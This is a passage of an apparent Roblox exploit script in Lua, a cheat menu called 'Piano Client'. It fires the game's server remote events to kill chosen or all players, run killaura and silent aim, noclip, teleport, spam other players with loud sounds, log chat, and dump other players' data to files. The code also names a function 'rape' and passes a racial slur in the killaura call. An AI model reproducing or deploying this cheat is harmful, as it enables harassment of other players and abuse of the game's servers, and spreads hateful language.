-660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1316.70593, 317.856842, -661.557617, 1, 0, 0, 0, -1, 0, 0, 0, -1))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1316.70593, 317.856842, -661.557617, -0.499959469, -0, -0.866048813, 0, -1, 0, -0.866048813, 0, 0.499959469))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1352.76184, 317.856842, -640.74292, 1, 0, 0, 0, -1, 0, 0, 0, -1))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1280.76147, 317.856842, -682.307983, 0.500045776, 0, -0.865998983, 0, -1, -0, -0.865998983, 0, -0.500045776))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1280.76147, 317.856842, -682.307983, 0.865962565, 0, 0.500108838, 0, -1.00000024, 0, 0.500108838, 0, -0.865962744))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1280.76147, 317.856842, -682.307983, 0.866051912, 0, -0.499954134, 0, -1.00000048, -0, -0.499954134, 0, -0.86605227))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1280.76147, 317.856842, -682.307983, 1, 0, 0, 0, -1, 0, 0, 0, -1))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1280.76147, 317.856842, -682.307983, 0, 0, -1, 0, -1, -0, -1, 0, -0))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1280.76147, 317.856842, -682.307983, -0.499959469, -0, -0.866048813, 0, -1, 0, -0.866048813, 0, 0.499959469))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1352.76184, 317.856842, -640.74292, -0.499959469, -0, -0.866048813, 0, -1, 0, -0.866048813, 0, 0.499959469))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1352.76184, 317.856842, -640.74292, 0, 0, -1, 0, -1, -0, -1, 0, -0))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1352.76184, 317.856842, -640.74292, 0.500045776, 0, -0.865998983, 0, -1, -0, -0.865998983, 0, -0.500045776))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1352.76184, 317.856842, -640.74292, 0.866051912, 0, -0.499954134, 0, -1.00000048, -0, -0.499954134, 0, -0.86605227))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1352.76184, 317.856842, -640.74292, 0.866007268, 0, 0.500031412, 0, -1.00000024, 0, 0.500031412, 0, -0.866007447))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1316.70593, 317.856842, -661.557617, 0.866051912, 0, -0.499954134, 0, -1.00000048, -0, -0.499954134, 0, -0.86605227))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1295.64209, 317.856842, -625.070068, 0, 0, 1, 0, -1, 0, 1, 0, -0))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1337.37195, 317.856842, -697.356018, 1, 0, 0, 0, -1, 0, 0, 0, -1))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1337.37195, 317.856842, -697.356018, 0.866007268, 0, 0.500031412, 0, -1.00000024, 0, 0.500031412, 0, -0.866007447))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1337.37195, 317.856842, -697.356018, 0.499959469, 0, 0.866048813, 0, -1, 0, 0.866048813, 0, -0.499959469))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1337.37195, 317.856842, -697.356018, 0, 0, 1, 0, -1, 0, 1, 0, -0))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1337.37195, 317.856842, -697.356018, 0.866051912, 0, -0.499954134, 0, -1.00000048, -0, -0.499954134, 0, -0.86605227))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1295.64209, 317.856842, -625.070068, 0.866051912, 0, -0.499954134, 0, -1.00000048, -0, -0.499954134, 0, -0.86605227))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1295.64209, 317.856842, -625.070068, 1, 0, 0, 0, -1, 0, 0, 0, -1))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1295.64209, 317.856842, -625.070068, 0.866007268, 0, 0.500031412, 0, -1.00000024, 0, 0.500031412, 0, -0.866007447))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1295.64209, 317.856842, -625.070068, 0.499959469, 0, 0.866048813, 0, -1, 0, 0.866048813, 0, -0.499959469))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1258.66675, 320.3862, -635.164429, 2.05039978e-05, -0.499938965, 0.866060615, -1, -2.05039978e-05, 1.18613243e-05, 1.18613243e-05, -0.866060615, -0.499938965))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1339.69336, 320.291534, -637.384888, 2.05039978e-05, -0.499938965, 0.866060615, -1, -2.05039978e-05, 1.18613243e-05, 1.18613243e-05, -0.866060615, -0.499938965))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))buildevent:FireServer(1, "Wooden Wall Thick (2x3)", workspace.Buildings:WaitForChild(LocalPlayer.Name):WaitForChild"Node":GetPivot():ToWorldSpace(CFrame.new(-1313.69995, 377.799988, -660.700012, -0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, -0.499959469):ToObjectSpace(CFrame.new(-1288.74048, 322.28537, -617.803284, 2.05039978e-05, 0.499938965, 0.866060615, 1, -2.05039978e-05, -1.18613243e-05, 1.18613243e-05, 0.866060615, -0.499938965))),nil,BrickColor.new(BrickColor.Random().Number),nil,nil,tostring(ingamematerials[math.random(1,#ingamematerials)]):sub(15,35))
		wait(3)for i,v in pairs(workspace.Buildings:WaitForChild(LocalPlayer.Name):GetChildren()) do
		if v.Name ~= 'Node' then buildevent:FireServer(7,v,v:GetPivot(),nil,3)end end
		workspace.Buildings:WaitForChild(LocalPlayer.Name).Node.PrimaryPart.Size = Vector3.new(2,2,2)
		sendnotification("Loaded Clannie Shredder 9000")
    end)
    
    -- Players | Globals
    
    local Playertab = Main.SideTab("Players",2.1)
    
    local plrtab = Playertab.Section("Player")
    
    plrtab.Box("Select","Player", function(a)
        if GetPlr(a) ~= nil then
            var.selected = GetPlr(a)
            sendnotification("Selected - "..var.selected.Name)
        else
            senderror("Player Doesn't Exist, Set to "..LocalPlayer.Name)
            var.selected = LocalPlayer
        end
    end)
    
    plrtab.Label("Player Specific")
    
    plrtab.Button("Steal Outfit", function()
        setclipboard(tostring(var.selected.PlayerData.Outfit.Value))
        sendnotification("Copied Players Outfit to Clipboard")
    end)
    
    plrtab.Button("Kill Player", function()
        if IsValid(var.selected) and not Friend(var.selected) then
            local j
            rape(var.selected)
            j = var.selected.Character:FindFirstChild("Humanoid").Died:Connect(function()
                sendnotification("Killed "..var.selected.Name)
                j:Disconnect()
            end)
        end
    end)
    
    plrtab.Button("Killaura Whitelist Player",function()
        if Players:FindFirstChild(var.selected.Name) then
            if table.find(kawhitelist, var.selected.Name) then
                for i,v in ipairs(kawhitelist) do
                    if v == var.selected.Name then
                        table.remove(kawhitelist, i)
                        sendnotification("Blacklisted "..var.selected.Name)
                    end
                end
            else
                table.insert(kawhitelist, var.selected.Name)
                sendnotification("Whitelisted "..var.selected.Name)
            end
        else
            senderror("Player Doesn't Exist")
        end
    end)
    
    plrtab.Button("Healaura Blacklist Player",function()
        if Players:FindFirstChild(var.selected.Name) then
            if table.find(healaurablacklist, var.selected.Name) then
                for i,v in ipairs(healaurablacklist) do
                    if v == var.selected.Name then
                        table.remove(healaurablacklist, i)
                        sendnotification("Whitelisted "..var.selected.Name)
                    end
                end
            else
                table.insert(healaurablacklist, var.selected.Name)
                sendnotification("Blacklisted "..var.selected.Name)
            end
        else
            senderror("Player Doesn't Exist.")
        end
    end)
    
    
    plrtab.Button("Ear Rape Player",function()
        for i = 1,100 do wait()
            if IsValid(var.selected) and not Friend(var.selected) then
               getrenv()._G.Triggered(var.selected.Character:FindFirstChild("HumanoidRootPart"), sounds[math.random(1,5)],"")
            end
        end
    end)

    plrtab.Button("Teleport To Player",function()
        Tween(var.selected.Character:GetPivot(), .5)
        wait(.5)
        sendnotification("Arrived at "..var.selected.Name.."'s Position")
    end)

    plrtab.Button("View",function()
        game:GetService("Workspace").Camera.CameraSubject = var.selected.Character:WaitForChild("Humanoid")
        sendnotification("Viewing "..var.selected.Name)
    end)
    
    plrtab.Button("Unview", function()
        game:GetService("Workspace").Camera.CameraSubject = LocalPlayer.Character:WaitForChild("Humanoid")
        sendnotification("Unviewed")
    end)
    
    plrtab.Button("Heal Player", function()
        if IsValid(var.selected) then
            local oldpos = LocalPlayer.Character:GetPivot()
            for i,v in ipairs(LocalPlayer.Backpack:GetChildren()) do
                if v.Name:find("MediGun") then
                    v.Parent = LocalPlayer.Character
                end
            end
            wait(.2)
            for i,v in ipairs(LocalPlayer.Character:GetChildren()) do
                if v.Name:find("MediGun") then
                    for i = 1,32 do
                        if not magnitudeplrs(LocalPlayer, var.selected, 30) then
                            LocalPlayer.Character:SetPrimaryPartCFrame(var.selected.Character:GetPivot())
                        end
                        game:GetService("ReplicatedStorage").Events.ToolsEvent:FireServer(5, var.selected.Character.Humanoid)
                        wait(.0468)
                        game:GetService("ReplicatedStorage").Events.ToolsEvent:FireServer(5, v)
                    end
                else
                    senderror("No MediGun Found")
                end
            end
            Tween(oldpos, .4)
        end
    end)
    
    plrtab.Button("Steal Player Song", function()
        local build = game:GetService("Workspace").Buildings:FindFirstChild(var.selected.Name)
        if build ~= nil and build:FindFirstChild("Jukebox") then
            setclipboard(tostring(build:FindFirstChild("Jukebox").Speaker.Sound.SoundId):gsub("rbxassetid://","https://www.roblox.com/library/"))
            sendnotification("Copied song Id to clipboard")
        else
            senderror("No Node Found/No Jukebox Found")
        end
    end)
    
    plrtab.Button("Dump Player Data",function()
        local data = ""
        if Players:FindFirstChild(var.selected.Name) then
            for i,v in ipairs(var.selected:GetDescendants()) do
                if v:IsA("BoolValue") or v:IsA("IntValue") or v:IsA("StringValue") then
                    data = data..v.Name.." = "..tostring(v.Value).."\n"
                end
            end
            writefile("Piano Client/"..var.selected.Name.."'s Dumped PlayerData ["..math.random(1,99999).."].piano",data)
            sendnotification("Dumped Player Data, Check workspace folder in exploit.")
        else
            senderror("Player Doesn't Exist")
        end
    end)
    
    plrtab.Label("Players")

    plrtab.Button("Unbreak Kill", function()
        var.unbreakkill = true
        wait(.1)
        var.unbreakkill = false
    end)
    
    plrtab.Toggle("Friend Service",var.FriendService,function(a)
        var.FriendService = a
        togglenote("Friend Service",var.FriendService)
    end)

    plrtab.Button("Kill All Flagged", function()
        opos = LocalPlayer.Character:GetPivot()
        for i, v in ipairs(Players:GetPlayers()) do
            flagup()
            if v ~= LocalPlayer and IsValid(v) and not IsSemiGodded(v) and GetColorName(v) == "Red" or GetColorName(v) == "Orange" and not Friend(v) then
                rape(v)
                wait(.5)
            end
        end
        Tween(opos, .4)
    end)
    
    plrtab.Toggle("Loop Earrape All",var.errall,function(a)
        var.errall = a
        togglenote("Loop Earrape All",var.errall)
    end)
    
    plrtab.Toggle("Chat Troll",var.ctroll,function(a)
        var.ctroll = a
        togglenote("Chat Troll",var.ctroll)
    end)

    plrtab.Toggle("Chat Logger",var.msglog,function(a)
        var.msglog = a
        togglenote("Chat Logger",var.msglog)
    end)

    if var.outfits ~= nil then
        local outtab = Main.SideTab("Outfits", #var.outfits/7.53+.3)

        local outsec = outtab.Section("Outfits")

        for i,v in ipairs(var.outfits) do
            outsec.Button(v.Name,function()
                coroutine.wrap(function()
                    for i = 1,5 do
                        game:GetService('ReplicatedStorage'):FindFirstChild('Events').MenuActionEvent:FireServer(8,{v.Name;v.ID;true})
                    end
                    wait(.2)
                    antistealoutfit()
                end)()
                sendnotification("Wore "..v.Name)
            end)
        end

        outsec.Toggle("Anti Outfit Steal",var.AntiSteal,function(a)
            var.AntiSteal = a
            togglenote("Anti Outfit Steal",var.AntiSteal)
        end)

        outsec.Button("Wear random Outfit",function()
            local ranomdoutfit = var.outfits[math.random(1,#var.outfits)]
            coroutine.wrap(function()
                for i = 1,5 do
                    game:GetService('ReplicatedStorage'):FindFirstChild('Events').MenuActionEvent:FireServer(8,{ranomdoutfit.Name;ranomdoutfit.ID;true})
                end
                wait(.2)
                antistealoutfit()
            end)()
            sendnotification("Wore random outfit")
        end)

        outsec.Toggle("Loop wear random Outfits",var.looprandomoutfits,function(a)
            var.looprandomoutfits = a 
            togglenote("Loop random Outfits",var.looprandomoutfits)
        end)

        outsec.Slider("Loop random Outfits Speed",0,20,var.looprandomoutfitstime,true,function(a)
            var.looprandomoutfitstime = a
        end)
    end

    -- Misc
    
    local MF = Main.SideTab("Configuration",1.85)

    local Misctab = MF.Section("Configuration")
        
    Misctab.Slider("FPS Cap",10,1000,var.fpscap,true,function(a)
        var.fpscap = a
        setfpscap(math.floor(a))
    end)

    Misctab.Label("Notifications")

    Misctab.Slider("Left Note Size",.1,1,.9,true,function(a)
        var.notesize = a
        l__NoteSample__1.Size = UDim2.new(a, 0, 0, 40)
    end)

    Misctab.Box("Error Sound","Sound ID",function(a)
        var.errorsound = a
        note_4.SoundId = "rbxassetid://"..a
        sendnotification("Error Sound - "..a)
    end)

    Misctab.Box("Note Sound","Sound ID",function(a)
        var.notesound = a
        note_3.SoundId = "rbxassetid://"..a
        LocalPlayer.PlayerGui.Client.SFX.note3.SoundId = "rbxassetid://"..a
        LocalPlayer.PlayerGui.Client.SFX.note2.SoundId = "rbxassetid://"..a
        LocalPlayer.PlayerGui.Client.SFX.note1.SoundId = "rbxassetid://"..a
        sendnotification("Note Sound - "..a)
    end)

    Misctab.Toggle("Hide Notifications",var.SNotifs,function(a)
        var.SNotifs = a
        togglenote("Hide Notifications",var.SNotifs)
    end)
    
    Misctab.Dropdown(var.NSide or "Side",{"Left","Right"},function(a)
        var.NSide = a
        sendnotification("Notification_Side - "..var.NSide)
    end)

    Misctab.Label("Joins")
    
    Misctab.Button("Copy Game TP",function()
        setclipboard('game:GetService("TeleportService"):TeleportToPlaceInstance("'..game.PlaceId..'","'..game.JobId..'")')
        sendnotification("Game TP copied to clipboard")
    end)
    
    Misctab.Button("Rejoin", function()
        game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId)
        sendnotification("Rejoining...")
    end)

    Misctab.Box("Join JobID","Job ID",function(a)
        game:GetService('TeleportService'):TeleportToPlaceInstance(2262441883, a)
        sendnotification("Attempting to join...")
    end)

    Misctab.Label("Commands")

    Misctab.Box("Prefix","Prefix",function(a)
        var.prefix = a:sub(1,1)
        sendnotification("Command Prefix - "..var.prefix)
        TextLabelc.Text = "Your Prefix: "..var.prefix
    end)
    
    Misctab.Label("Credits")
    
    Misctab.Button("Copy Discord Invite", function()
        setclipboard("https://discord.gg/pornhub")
        sendnotification("Discord Invite copied to clipboard")
    end)
    
    Misctab.Button("sawd#8020",function()
        sendnotification("making almost everything")
    end)
    
    Misctab.Button("Alice",function()
        sendnotification("helpin with tool manipulation")
    end)
    
    Misctab.Button("a mysterious man",function()
        sendnotification("thanks to whoever made this ui lib")
    end)

    function ren(f)
        game:GetService("RunService").RenderStepped:Connect(f)
    end
    
    function her(f)
        game:GetService("RunService").Heartbeat:Connect(f)
    end

    function ste(f)
        game:GetService("RunService").Stepped:Connect(f)
    end

    function wwd(t,f)
        coroutine.resume(coroutine.create(function()while wait(t)do f()end end))
    end
    
    ste(function()
        if var.nocol and IsValid(LocalPlayer) then
            for i,v in ipairs(LocalPlayer.Character:GetChildren()) do
                if v:IsA("BasePart") and var.nocol and v.CanCollide then
                    v.CanCollide = false
                end
            end
        end    
    end)

    coroutine.resume(coroutine.create(function()
        while wait(var.looprandomoutfitstime) do
            if var.looprandomoutfits then
                local ranomdoutfit = var.outfits[math.random(1,#var.outfits)] game:GetService('ReplicatedStorage'):FindFirstChild('Events').MenuActionEvent:FireServer(8,{ranomdoutfit.Name;ranomdoutfit.ID;true})
            end
        end
    end))

    wwd(.1,function()
        if var.silentaim then
            local dist = math.huge
            local mouse = game:GetService("UserInputService"):GetMouseLocation()
            for i,v in pairs(Players:GetPlayers()) do
                if IsValid(v) and v ~= LocalPlayer then
                    local _,m = game:GetService("Workspace").Camera:WorldToScreenPoint(v.Character:GetPivot().p)
                    local j = workspace.Camera:WorldToViewportPoint(v.Character:GetPivot().p)
                    local k = (Vector2.new(mouse.x,mouse.y)-Vector2.new(j.x,j.y)).magnitude
                    if k <= dist and k <= (var.ss or 500)  then
                        dist = k
                        sel = v
                    end
                end
            end
        end
    end)

    ren(function()
        if var.noclip and IsValid(LocalPlayer) then
            LocalPlayer.Character:WaitForChild('Humanoid'):ChangeState(11)
        end
        
        if var.cursor and Mouse.Icon ~= "" and Mouse.Icon ~= "rbxasset://textures/ArrowFarCursor.png" then
            if var.cursor and var.cursorid ~= "" then
                Mouse.Icon = "rbxassetid://"..var.cursorid
            else
                Mouse.Icon = "rbxassetid://2872049636"
            end
        end
        
        if var.errall then
            getrenv()._G.Triggered(game:GetService("Lighting"), sounds[math.random(1,5)],"")
        end
            
        if var.uiop then
            local c = LocalPlayer.Character:GetPivot()
            LocalPlayer.Character:PivotTo(c + c.LookVector * var.walkspeeds)
        end
    end)

    wwd(.5,function()
        if var.antispy then
            for i,v in pairs(Players:GetPlayers()) do
                if var.antispy and IsValid(v) then
                    for i2,v2 in ipairs(v.Character:GetChildren()) do
                        if v2:IsA("MeshPart") then
                            v2.Transparency = 0
                        end
                        if v2.Name:find("NameTag") and v2.Enabled ~= true then
                            v2.Enabled = true
                        end
                    end
                end
            end
        end
        if var.healaura and IsTool(LocalPlayer) and GetTool(LocalPlayer) ~= nil and GetTool(LocalPlayer).Name:find("Medi") then
            for i,v in pairs(Players:GetPlayers()) do
                if v ~= LocalPlayer and IsValid(v) and not table.find(healaurablacklist,v.Name) and v.Character:FindFirstChild("Humanoid").Health ~= 0 and v.Character:FindFirstChild("Humanoid").Health ~= v.Character:FindFirstChild("Humanoid").MaxHealth and magnitudeplrs(LocalPlayer,v,30) then
                    for i=1,40 do
                        game:GetService("ReplicatedStorage").Events.ToolsEvent:FireServer(5, v.Character.Humanoid)
                        wait(.0468)
                        game:GetService("ReplicatedStorage").Events.ToolsEvent:FireServer(5, GetTool(LocalPlayer))
                    end
                end
            end
        end
        save()
    end)

    while wait(var.kaft) do
        if var.killaura then
            for i,v in ipairs(Players:GetPlayers()) do
                if IsValid(v) and v ~= LocalPlayer and not IsSemiGodded(v) and not Friend(v) and canbekilled(v) and not table.find(ebgenwgnWRHqew6WOJNRHWRH243gwjgnwj_81gnhjwngrjwNHKEMNWERG, v.Name) and not table.find(wrugjetutnwienbueijientbietbietbietibneitbnetitbjeiotbmeiotbhietbh,v.Name) and not table.find(kawhitelist,v.Name) and magnitudeplrs(LocalPlayer,v,var.kara) and v.Character:FindFirstChild("Humanoid").Health ~= 0 then
                    if GetGun(LocalPlayer) and GetGun(LocalPlayer):GetAttribute("Ammo") ~= 0 and  #game:GetService("Workspace").CurrentCamera:GetPartsObscuringTarget({v.Character:GetPivot().p}, {v.Character, LocalPlayer.Character}) == 0 then
                        game:GetService("ReplicatedStorage").Events.MenuActionEvent:FireServer(33,v.Character:WaitForChild('Head').CFrame,2,v.Character.Humanoid,GetGun(LocalPlayer):GetAttribute("Damage"),GetGun(LocalPlayer),nil,1,"nigger")
                    end
                end
            end
        end
    end
    
